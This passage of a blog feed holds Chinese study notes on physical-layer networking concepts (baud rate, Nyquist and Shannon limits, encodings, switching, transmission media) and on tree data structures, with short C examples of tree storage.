title="&emsp;&emsp;其别名为码元速率、波形速率、调制速率、符号速率等，它表示单位时间内数字通信系统所传输的码元个数（也可以称为脉冲个数或信号变化的次数），单位是波特（Baud）。1波特表示数字通信系统每秒传输一个码元"></a>&emsp;&emsp;其别名为码元速率、波形速率、调制速率、符号速率等，它表示单位时间内数字通信系统所传输的码元个数（也可以称为脉冲个数或信号变化的次数），单位是波特（Baud）。1波特表示数字通信系统每秒传输一个码元</h6><p>&emsp;&emsp;注：数字信号有多进制和二进制之分，但码元速率与进制数无关，至只与码元长度T有关</p><ul><li><h6 id="信息传输速率"><a href="#信息传输速率" class="headerlink" title="信息传输速率"></a>信息传输速率</h6></li></ul><p>&emsp;&emsp;别名信息速率、比特率等，表示单位时间内数字通信系统传输的二进制码元个数（即比特数），单位是比特/秒（b/s）</p><ul><li><h6 id="两者关系"><a href="#两者关系" class="headerlink" title="两者关系"></a>两者关系</h6></li></ul><p>&emsp;&emsp;若一个码元携带n比特的信息量，则M Baud的码元传输速率所对应的信息传输速率为M×n bit/s</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/7.jpg" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/8.jpg" style="zoom:73%;" /></center><p>&emsp;</p><h4 id="4-带宽"><a href="#4-带宽" class="headerlink" title="4.带宽"></a>4.带宽</h4><p>&emsp;&emsp;不同的领域中对于带宽是有着不同的解释的， </p><ul><li>在模拟信号系统中</li></ul><p>&emsp;&emsp;当输入的信号频率高或低到一定程度，使得系统的输出概功率成为输入功率的一半时，最高频率和最低频率之间的差值就代表了系统的通频带宽，其单位为赫兹(Hz)</p><ul><li>在数字设备中</li></ul><p>&emsp;&emsp;表示在单位时间内从网络的某一个点到另外一点所能通过的最高数据率/单位时间内通过链路的数量，常用来表示网络的通信线路所能传输数据的能力。单位是比特每秒（bps）</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/9.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;</p><h4 id="5-失真"><a href="#5-失真" class="headerlink" title="5.失真"></a>5.失真</h4><ul><li>失真情况</li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/10.jpg" style="zoom:80%;" /></center><ul><li>码间串扰</li></ul><p>&emsp;&emsp;是指频率过快，接收端所接收到的信号波形失去了码元之间清晰界限的现象，无法分清是0还是1，所以不能进行通过</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/11.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="6-奈氏准则（奈奎斯特定理）"><a href="#6-奈氏准则（奈奎斯特定理）" class="headerlink" title="6.奈氏准则（奈奎斯特定理）"></a>6.奈氏准则（奈奎斯特定理）</h4><p>&emsp;&emsp;为了解决码间串扰，提出了奈氏准则，它 是指在理想低通（无噪声，宽带受限）条件下，为了避免马建串扰，极限码元传输速率为2W Baud，W是通信带宽，单位是Hz。</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/12.jpg" style="zoom:80%;" /></center><ul><li>例题</li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/13.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="7-香农定理"><a href="#7-香农定理" class="headerlink" title="7.香农定理"></a>7.香农定理</h4><p>&emsp;&emsp;噪声存在于所有的电子设备和通信信道中。由于噪声随机产生，它的瞬时值有时会很大，因此噪声会使接收端对码元的判决产生错误。但是噪声的影响是相对的，若信号较强，那么噪声相对影响比较小。因此，信噪比就很重要。</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/14.jpg" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/15.jpg" style="zoom:80%;" /></center><ul><li>例题</li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/16.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="8-两者对比"><a href="#8-两者对比" class="headerlink" title="8.两者对比"></a>8.两者对比</h4><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/17.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="9-编码与调制"><a href="#9-编码与调制" class="headerlink" title="9.编码与调制"></a>9.编码与调制</h4><ul><li>基带信号与宽带信号</li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/18.jpg" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/19.jpg" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/28.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="10-六种编码类型"><a href="#10-六种编码类型" class="headerlink" title="10.六种编码类型"></a>10.六种编码类型</h4><ul><li>非归零编码（NRZ）</li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/20.jpg" style="zoom:80%;" /></center><ul><li>曼彻斯特编码</li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/21.jpg" style="zoom:80%;" /></center><ul><li>差分曼彻斯特编码</li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/22.jpg" style="zoom:80%;" /></center><ul><li>归零编码（RZ）</li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/23.jpg" style="zoom:80%;" /></center><ul><li>反向不归零编码（NRZI）</li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/24.jpg" style="zoom:80%;" /></center><ul><li>4B/5B编码</li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/25.jpg" style="zoom:80%;" /></center>&emsp;<h4 id="11-数字数据调制为模拟信号"><a href="#11-数字数据调制为模拟信号" class="headerlink" title="11.数字数据调制为模拟信号"></a>11.数字数据调制为模拟信号</h4><p>&emsp;&emsp;数字数据调制技术在发送端将数字信号转化为模拟型信号，而在接收端将模拟信号还原为数字信号，分别对应于调制解调器的调制和解调过程</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/26.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="12-模拟数据编码为数字信号"><a href="#12-模拟数据编码为数字信号" class="headerlink" title="12.模拟数据编码为数字信号"></a>12.模拟数据编码为数字信号</h4><p>&emsp;&emsp;在计算机内部处理的是二进制数据，所以需要将模拟音频通过采样、量化转换成有限个数字表示的离散序列（即实现了音频数字化）。这其中最典型的例子就是对音频信号进行编码的脉码调制（PCM），在计算机应用中，能够达到最高保真水平的就是PCM编码，被广泛用于材料保存以及音乐欣赏，CD、DVD以及我们常见的WAV文件中均有应用。它主要包括三步：抽样、量化、编码</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/27.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="13-模拟数据调制为模拟信号"><a href="#13-模拟数据调制为模拟信号" class="headerlink" title="13.模拟数据调制为模拟信号"></a>13.模拟数据调制为模拟信号</h4><p>&emsp;&emsp;为了实现传输的有效性，可能需要较高的频率，这种调制方式还可以使用频分复用技术，成分利用带宽资源。在电话机和本地交换机所传输的信号是采用模拟信号传输模拟数据的方式；模拟的声音数据是加载到模拟的载波信号中传输的。</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/29.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="14-数据交换方式"><a href="#14-数据交换方式" class="headerlink" title="14.数据交换方式"></a>14.数据交换方式</h4><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/38.jpg" style="zoom:50%;" /></center><ul><li><h6 id="电路交换方式"><a href="#电路交换方式" class="headerlink" title="电路交换方式"></a>电路交换方式</h6></li></ul><p>&emsp;&emsp;在数据传输期间，源结点与目的结点之间有一条由之间结点构成的专用物理连接线路，在数据传输结束之前，这条线路一直保持</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/30.jpg" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/32.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;特点：独占资源，用户始终占用端到端的固定传输带宽。适用于远程批处理信息传输或系统间实时性要求高的大量数据传输的情况</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/31.jpg" style="zoom:80%;" /></center><ul><li><h6 id="报文交换方式"><a href="#报文交换方式" class="headerlink" title="报文交换方式"></a>报文交换方式</h6></li></ul><p>&emsp;&emsp;报文是网络中交换与传输的数据单位，即站点一次性要发送的数据块，报文包含了将要发送的完整的数据信息，其长短很不一致，长短不限并且可变</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/33.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;报文交换的原理：无需在两个站点之间建立一条专用通路，其数据传输的单位是报文，传送过程采用存储转发的方式</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/34.jpg" style="zoom:80%;" /></center><ul><li><h6 id="分组交换方式"><a href="#分组交换方式" class="headerlink" title="分组交换方式"></a>分组交换方式</h6></li></ul><p>&emsp;&emsp;分组是指大多数计算机网络不能连续地传送任意长的数据，所以机上网络系统把数据分割成小块，然后逐块地发送吗，这种小块就称为分组</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/35.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;分组交换原理：分组交换与报文交换的工作方式基本相同，都采用存储转发方式，形式上的主要差别在于，分组交换网络中要限制所传输的数据单位的长度，一般是选128B。发送结点首先对从终端设备送来的数据报文进行接收、存储。而后将报文划分成一定长度的分组，并以分组为单位进行传输和交换。接收结点将收到的分组组装成的信息或报文</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/36.jpg" style="zoom:80%;" /></center><ul><li>数据交换方式的选择</li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/37.jpg" style="zoom:80%;" /></center><ul><li>数据报方式</li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/39.jpg" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/40.jpg" style="zoom:80%;" /></center><ul><li>虚电路方式</li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/41.jpg" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/42.jpg" style="zoom:80%;" /></center><ul><li> 数据报和虚电路对比</li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/43.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="15-传输介质"><a href="#15-传输介质" class="headerlink" title="15.传输介质"></a>15.传输介质</h4><p>&emsp;&emsp;传输介质也称传输媒体/传输媒介，它就是数据传输系统中在发送设备和接收设备之间的物理通路。</p><p>&emsp;&emsp;需要注意的是，传输媒体并不是物理层，传输媒体在物理层的下面，因为物理层是体系结构的第一层，因此有时称传输媒体为第0层。在传输媒体中传输的是信号，但传输媒体并不知道所传输的信号代表什么意思，但物理层规定了电气特性，因此能够识别所传送的比特流</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/44.jpg" style="zoom:80%;" /></center><h4 id="16-导向性传输介质"><a href="#16-导向性传输介质" class="headerlink" title="16.导向性传输介质"></a>16.导向性传输介质</h4><ul><li>双绞线</li></ul><p>&emsp;&emsp;双绞线是古老、又常用的传输介质，它由两根采用一定规则并排绞合的、相互绝缘的铜导线组成，其绞合可以减少对相邻导线的电磁干扰</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/45.jpg" style="zoom:80%;" /></center><ul><li>同轴电缆</li></ul><p>&emsp;&emsp;同轴电缆由道题铜质芯线、绝缘层、网状编制屏蔽层和塑料外层构成。按特性阻抗数值不认同，通常将同轴电缆分 为两类：50Ω同轴电缆和75Ω同轴电缆。其中，50Ω同轴电缆主要用于传送基带数字信号，又称为基带同轴电缆，它 在局域网中得到广泛应用；75Ω同轴电缆主要用于传送宽带信号，又称为宽带同轴电缆，它主要用于有线电视系统。</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/46.jpg" style="zoom:80%;" /></center><ul><li>光纤</li></ul><p>&emsp;&emsp;光纤通信就是利用光导纤维（光纤）传递光脉冲来进行通信。有光脉冲表示1无光脉冲表示0。对比频率，光纤通信系统的带宽远远大于目前其他各自传输媒体的带宽</p><p>&emsp;&emsp;光纤在发送端有光源，可以采用发光二极管或半导体激光器，它们在电脉冲作用下能产生出光脉冲；在接收端用光电 二极管做成光检测器，在检测到光脉冲时可还原出电脉冲。</p><p>&emsp;&emsp;光纤主要由纤芯和包层构成，光波通过纤芯进行传导，包层较纤芯有较低的折射率。当光线从高折射率的 介质射向低折射率的介质时，其折射角将大于入射角。因此，如果入射角足够大，就会出现全反射，即光线碰到包 层时候就会折射回纤芯、这个过程不断重复，光也就沿着光纤传输下去。</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/47.jpg" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/48.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;特点：1.传输损耗小，中继距离长，对远距离传输特别经济。 2.抗雷电和电磁干扰性能好。 3.无串音干扰，保密性好，也不易被窃听或截取数据。 4.体积小，重量轻。</p><p>&emsp;</p><h4 id="17-非导向性传输介质"><a href="#17-非导向性传输介质" class="headerlink" title="17.非导向性传输介质"></a>17.非导向性传输介质</h4><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/49.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="18-物理层设备"><a href="#18-物理层设备" class="headerlink" title="18.物理层设备"></a>18.物理层设备</h4><ul><li><h6 id="中继器"><a href="#中继器" class="headerlink" title="中继器"></a>中继器</h6></li></ul><p>&emsp;&emsp;*<em>诞生原因：</em>由于存在损耗，在线路上传输的信号功率会逐渐衰减，衰减到一定程度时将照成失真，因此会导致接受错误。</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/50.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;*<em>功能：</em>对信号进行再生和还原，对衰减的信号进行放大，保持与原数据系统，以增加信号传输的距离，延长网络的长度</p><p>&emsp;&emsp;*<em>中继器的两端：</em>两端的网络部分是网段，而不是子网，适用于完全相同的两类网路的互连，且两个网段速率要相同。中继器只将任何电缆段上的数据发送到另一段电缆上，它仅作用于信号的电气部分，并不管数据中是 否有错误数据或不适于网段的数据。<em>两端可连相同媒体，也可以连不同媒体。中继器两端的网段一定要是同一个协议</em></p><p>&emsp;&emsp;*<em>5-4-3规则：</em>网络标准中都对信号的延迟范围作了具体的规定，因而中继器只能在规定的范围内进行，否则会网络故障。</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/51.jpg" style="zoom:80%;" /></center><ul><li><h6 id="集线器（多口中继器）"><a href="#集线器（多口中继器）" class="headerlink" title="集线器（多口中继器）"></a>集线器（多口中继器）</h6></li></ul><p>&emsp;&emsp;*<em>功能：</em>对信号进行再生放大转发，对衰减的信号进行放大，接着转发到其他所有（除输入端口外）处于工作 状态的端口上，以增加信号传输的距离，延长网络的长度。不具备信号的定向传送能力，是一个共享式设备。</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/52.jpg" style="zoom:80%;" /></center>]]></content>
    
    
    <categories>
      
      <category>计算机网络学习笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>树</title>
    <link href="/2022/10/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/"/>
    <url>/2022/10/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/</url>
    
    <content type="html"><![CDATA[<h1 id="树"><a href="#树" class="headerlink" title="树"></a>树</h1><h4 id="1-定义"><a href="#1-定义" class="headerlink" title="1.定义"></a>1.定义</h4><p>&emsp;&emsp;树是一种数据结构，它是由n(n≥0)个有限节点组成一个具有层次关系的集合。把它叫做“树”是因为它看起来像一棵倒挂的树，也就是说它是根朝上，而叶朝下的。当n=0时，称为空树，这是一种特殊情况。</p><ul><li>有且仅有一个特定的称为根节点</li><li>没有后继的结点称为“叶子结点”</li><li>有后继的结点称为“分支结点”</li><li>除了根节点外，任何一个结点都有且仅有一个前驱</li><li>每个结点可以有0个或多个后继</li><li>当n&gt;1时，区域结点可以分为m（m&gt;0）个互不相交的有限集合，其中每一个集合本身又是一棵树，并且称为根节点的子树</li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/1.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="2-结点之间的关系"><a href="#2-结点之间的关系" class="headerlink" title="2.结点之间的关系"></a>2.结点之间的关系</h4><ul><li>祖先结点</li><li>子孙结点</li><li>双亲结点（父节点）</li><li>孩子结点</li><li>兄弟结点</li><li>堂兄弟结点</li></ul><p>&emsp;</p><h4 id="3-结点之间的属性"><a href="#3-结点之间的属性" class="headerlink" title="3.结点之间的属性"></a>3.结点之间的属性</h4><ul><li>路径</li></ul><p>&emsp;&emsp;只能从上到下，一个结点到另一个结点的连线</p><ul><li>路径长度</li></ul><p>&emsp;&emsp;从一个结点到另一个结点经过的边数</p><ul><li>结点的层次（深度）</li></ul><p>&emsp;&emsp;从上往下数处于第几层</p><ul><li>结点的高度</li></ul><p>&emsp;&emsp;从下往上数处于的第几层</p><ul><li>树的高度（深度）</li></ul><p>&emsp;&emsp;总共多少层</p><ul><li>结点的度</li></ul><p>&emsp;&emsp;有几个分支</p><ul><li>树的度</li></ul><p>&emsp;&emsp;各个结点的度的最大值</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/2.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="4-有序树vs无序树"><a href="#4-有序树vs无序树" class="headerlink" title="4.有序树vs无序树"></a>4.有序树vs无序树</h4><p>&emsp;&emsp;有序树从逻辑上看，树中结点的各个子树从左至右是有次序的，不能互换</p><p>&emsp;&emsp;无序树从逻辑上看，树中结点的各个子树从左到右是无次序的，可以互换。</p><p>&emsp;</p><h4 id="5-森林的定义"><a href="#5-森林的定义" class="headerlink" title="5.森林的定义"></a>5.森林的定义</h4><p>&emsp;&emsp;森林是m（m≥0）棵互不相交的树的集合</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/4.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="6-树的性质"><a href="#6-树的性质" class="headerlink" title="6.树的性质"></a>6.树的性质</h4><p>&emsp;&emsp;（是常见考点）</p><ul><li>结点数=总度数+1</li></ul><p>&emsp;&emsp;因为根节点的存在</p><ul><li>度为m的树与mm叉树的区别</li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/5.jpg" style="zoom:80%;" /></center><ul><li><p>度为m的树第i层至多有m^(i-1)个结点，m叉树第i层至多有m^(i-1)个结点</p></li><li><p>高度为h的m叉树至多有(m^h-1)/(m-1)个结点</p></li></ul><p>&emsp;&emsp;等比数列求和：a+aq+aq^2+aq^3+……+aq^(n-1)=[a(1-q^n)]/(1-q)</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/6.jpg" style="zoom:80%;" /></center><ul><li>高度为h的m叉树至少有h个结点，高度为h、度为m的树至少有h+m-1个结点</li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/7.jpg" style="zoom:80%;" /></center><ul><li>具有n个结点的m叉树的最小高度为 </li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/8.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/9.jpg" style="zoom:80%;" /></center>&emsp;<h4 id="7-二叉树的基本概念"><a href="#7-二叉树的基本概念" class="headerlink" title="7.二叉树的基本概念"></a>7.二叉树的基本概念</h4><p>&emsp;&emsp;二叉树是n（n≥0）个结点的有限集合：</p><ol><li>或者为空二叉树，即n = 0。 </li><li> 或者由一个根结点和两个互不相交的被称为根的左子树和右子树组成。左子树和右子树 又分别是一棵二叉树。 </li></ol><p>&emsp;&emsp;特点：①每个结点至多只有两棵子树 ②左右子树不能颠倒（二叉树是有序树）</p><ul><li><h6 id="二叉树的五种状态"><a href="#二叉树的五种状态" class="headerlink" title="二叉树的五种状态"></a>二叉树的五种状态</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/10.jpg" style="zoom:60%;" /></center><ul><li><h6 id="特殊二叉树"><a href="#特殊二叉树" class="headerlink" title="特殊二叉树"></a>特殊二叉树</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/11.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;注意：这里的完全二叉树允许度为1结点只能是左节点，如果是右节点就不是完全二叉树（完全二叉树是选择题的高频考点）</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/12.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/13.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="8-二叉树常考性质"><a href="#8-二叉树常考性质" class="headerlink" title="8.二叉树常考性质"></a>8.二叉树常考性质</h4><ul><li><h6 id="常见考点1"><a href="#常见考点1" class="headerlink" title="常见考点1"></a>常见考点1</h6></li></ul><p>&emsp;&emsp;设非空二叉树中度为0、1和2的结点个数分别为n0、n1和n2，则n0=n2+1（叶子结点比二分支结点多一个）</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/14.jpg" style="zoom:80%;" /></center><ul><li><h6 id="常见考点2"><a href="#常见考点2" class="headerlink" title="常见考点2"></a>常见考点2</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/15.jpg" style="zoom:80%;" /></center><ul><li><h6 id="常见考点3"><a href="#常见考点3" class="headerlink" title="常见考点3"></a>常见考点3</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/16.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="9-完全二叉树的常见考点"><a href="#9-完全二叉树的常见考点" class="headerlink" title="9.完全二叉树的常见考点"></a>9.完全二叉树的常见考点</h4><ul><li><h6 id="考点1"><a href="#考点1" class="headerlink" title="考点1"></a>考点1</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/17.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/19.jpg" style="zoom:80%;" /></center><ul><li><h6 id="考点2"><a href="#考点2" class="headerlink" title="考点2"></a>考点2</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/18.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="10-树的存储结构"><a href="#10-树的存储结构" class="headerlink" title="10.树的存储结构"></a>10.树的存储结构</h4><ul><li>顺序存储</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxSize 100</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span></span><br><span class="hljs-class">&#123;</span><br>    ElemType value;<br>    <span class="hljs-type">bool</span> idEmpty;<br>&#125;;<br><br>TreeNode t[MaxSize];<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;MaxSize;i++)<br>&#123;<br>    t[i].isEmpty=<span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/20.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/21.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/22.jpg" style="zoom:80%;" /></center><ul><li>链式存储</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiTNode</span></span><br><span class="hljs-class">&#123;</span><br>    ElemType data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiTNode</span> *<span class="hljs-title">lchild</span>,*<span class="hljs-title">rchild</span>;</span><br>&#125;BiTNode,*BiTree;<br><br><span class="hljs-comment">//定义空树</span><br>BiTree root = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">//插入根节点</span><br>root = (BiTree)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(BiTNode));<br>root-&gt;data = &#123;<span class="hljs-number">1</span>&#125;;<br>root-&gt;lchild = <span class="hljs-literal">NULL</span>;<br>root-&gt;rchild = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">//插入新结点</span><br>BiTNode *p = (BiTNode *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(BiTNode));<br>p-&gt;data = &#123;<span class="hljs-number">2</span>&#125;;<br>p-&gt;lchild = <span class="hljs-literal">NULL</span>;<br>p-&gt;rchild = <span class="hljs-literal">NULL</span>;<br>root-&gt;lchild = p;<br></code></pre></td></tr></table></figure><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%83/23.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;为了方便找到父节点，我们可以在结构体中再设置一个父指针，这样子的结构体称为三叉链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiTNode</span></span><br><span 